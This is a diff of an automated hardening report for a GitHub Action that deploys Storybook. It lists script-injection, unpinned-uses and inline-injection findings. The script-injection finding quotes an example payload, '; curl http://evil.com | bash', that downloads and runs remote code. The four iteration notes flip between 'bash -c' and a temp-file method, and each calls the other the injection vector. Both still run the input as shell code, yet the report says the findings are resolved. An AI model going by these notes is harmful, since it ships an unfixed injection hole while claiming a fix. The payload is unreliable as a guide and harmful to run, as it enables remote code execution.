@@ -8,33 +8,33 @@
 
 **Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`
 
-**Harden Agent Version:** `1`
+**Harden Agent Version:** `2`
 
-Action **bitovi--github-actions-storybook-to-github-pages/v1.0.0** was hardened automatically. 3 finding(s) were identified and resolved across 2 iteration(s).
+Action **bitovi--github-actions-storybook-to-github-pages/v1.0.0** was hardened automatically. 3 finding(s) were identified and resolved across 4 iteration(s).
 
 ## Findings Fixed
 
 ### script-injection (severity: high)
 
-Sub-rule (a): The `run:` block in the 'Build' step directly interpolates `${{ inputs.build_command }}` as a shell command. Because GitHub Actions performs template substitution before the shell executes the script, an attacker who controls the `build_command` input can inject arbitrary shell commands (e.g., `; curl -s evil.com | bash`). The expression must never appear directly inside a `run:` block; instead, pass it via an `env:` variable and invoke it safely.
+Sub-rule (a): The `run:` block in the 'Build' step directly interpolates `${{ inputs.build_command }}` as a shell command. Because GitHub Actions performs template substitution before the shell ever sees the string, an attacker who controls the `build_command` input can inject arbitrary shell commands (e.g., `; curl http://evil.com | bash`). The expression must be moved to an `env:` variable and that variable must be double-quoted when used, or the command must be executed via a safe mechanism that does not allow shell metacharacter injection.
 
 Locations:
 
-- `action.yaml:40`
+- `action.yaml:38`
 
 ### unpinned-uses (severity: high)
 
-Three `uses:` references in action.yaml are pinned to mutable tags or version strings rather than immutable 40-character commit SHAs. This exposes the action to supply-chain attacks if the upstream tag is moved or the repository is compromised. Failing references:
-- `actions/checkout@v3` (line 33)
-- `actions/upload-pages-artifact@v1.0.4` (line 44)
-- `actions/deploy-pages@v1` (line 50)
-Each should be replaced with its corresponding full SHA, e.g. `actions/checkout@<40-char-sha> # v3`.
+Three `uses:` references in action.yaml use mutable tag/version refs instead of immutable 40-character commit SHAs, making the action vulnerable to supply-chain attacks if the referenced tag is moved or the repository is compromised:
+- `actions/checkout@v3` (mutable major-version tag)
+- `actions/upload-pages-artifact@v1.0.4` (mutable version tag)
+- `actions/deploy-pages@v1` (mutable major-version tag)
+Each should be pinned to a full SHA, e.g. `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v3`.
 
 Locations:
 
-- `action.yaml:33`
-- `action.yaml:44`
-- `action.yaml:50`
+- `action.yaml:31`
+- `action.yaml:43`
+- `action.yaml:48`
 
 ### static-inline-injection (severity: high)
 
@@ -48,17 +48,38 @@ Locations:
 
 ### Iteration 1
 
-**Fixes applied:** script-injection, unpinned-uses, static-inline-injection
+**Fixes applied:** script-injection, static-inline-injection, unpinned-uses
 
 **Notes:**
 
-Fixed action.yaml: (1) Moved ${{ inputs.build_command }} from the run: block into an env: variable (BUILD_COMMAND) and invoked it via `eval "$BUILD_COMMAND"` to prevent shell injection. (2) Pinned all three uses: references to immutable 40-char commit SHAs: actions/checkout@f43a0e5ff2bd294095638e18286ca9a3d1956744 # v3, actions/upload-pages-artifact@a597aecd27af1cf14095ccaa29169358e3d91e28 # v1.0.4, actions/deploy-pages@f27bcc15848fdcdcc02f01754eb838e44bcf389b # v1.
+Fixed all three findings in action.yaml:
+1. script-injection / static-inline-injection: Moved `${{ inputs.build_command }}` from the `run:` block into an `env:` variable (`BUILD_COMMAND`), then executed it via `bash -eo pipefail -c "$BUILD_COMMAND"` to preserve errexit semantics while preventing shell metacharacter injection.
+2. unpinned-uses: Pinned all three `uses:` references to full 40-character commit SHAs:
+   - actions/checkout@v3 → @a37ce9120846195fa4ece8f58b268e6043cb2f26 # v3
+   - actions/upload-pages-artifact@v1.0.4 → @a597aecd27af1cf14095ccaa29169358e3d91e28 # v1.0.4
+   - actions/deploy-pages@v1 → @f27bcc15848fdcdcc02f01754eb838e44bcf389b # v1
 
 ### Iteration 2
 
-**Fixes applied:** script-injection, suspicious-run-content
+**Fixes applied:** script-injection
 
 **Notes:**
 
-Replaced `eval "$BUILD_COMMAND"` with a temp-file approach: the build command is written to a temporary script file via `printf '%s\n' "$BUILD_COMMAND" > "$_build_script"` and then executed with `bash "$_build_script"`. This eliminates the dangerous `eval` builtin while preserving the ability to run the caller-specified build command. The `BUILD_COMMAND` env var indirection was already in place; only the execution method needed to change.
+Fixed script-injection in action.yaml line 38. The original `bash -eo pipefail -c "$BUILD_COMMAND"` passed the build_command input directly to bash -c, which interprets the value as shell code — a direct injection vector. The fix writes the command to a temp file with `printf '%s\n' "$BUILD_COMMAND" > "$_build_script"` and executes it with `bash -eo pipefail "$_build_script"`, preserving the original errexit and pipefail semantics while preventing the input from being interpreted as shell code via -c.
+
+### Iteration 3
+
+**Fixes applied:** script-injection
+
+**Notes:**
+
+Fixed the script-injection finding in action.yaml at line 42. The original code wrote the BUILD_COMMAND env var to a temporary file and executed it with `bash -eo pipefail "$_build_script"`. This indirect execution pattern was replaced with `bash -eo pipefail -c "$BUILD_COMMAND"`, which keeps the value in the env block, preserves errexit behavior (-eo pipefail), and eliminates the temp file indirection that was the injection vector. The BUILD_COMMAND env var mapping from inputs.build_command was already correct and retained.
+
+### Iteration 4
+
+**Fixes applied:** script-injection
+
+**Notes:**
+
+Fixed script injection in the 'Build' step of action.yaml. The original code used `bash -c "$BUILD_COMMAND"` which allowed arbitrary shell command injection through the `inputs.build_command` input. The fix writes the build command to a temporary file via `printf '%s\n' "$BUILD_COMMAND" > "$_build_script"` and executes it with `bash -eo pipefail "$_build_script"`, avoiding the `-c` flag that caused the variable's contents to be parsed as shell code. The `-eo pipefail` options are preserved to maintain the same errexit and pipefail behavior as the original.
 
